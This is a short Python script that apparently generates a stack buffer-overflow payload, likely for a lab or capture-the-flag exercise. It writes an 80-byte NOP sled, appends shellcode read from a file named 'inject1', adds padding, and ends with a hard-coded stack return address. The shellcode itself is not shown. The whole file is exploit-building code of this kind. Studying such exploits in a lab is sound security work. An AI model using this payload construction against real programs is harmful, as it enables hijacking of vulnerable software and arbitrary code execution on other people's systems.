import sys

#with open('inject1', 'r') as fin:
        #print fin.read(),

sys.stdout.write("\x90" * 80)# + "a" * 13 + '\x00\xca\xe3\xf7')

with open('inject1', 'r') as fin:
        sys.stdout.write(fin.read())

sys.stdout.write('-' * (128-80-37+12))
sys.stdout.write('\xc8\xd5\xff\xff')


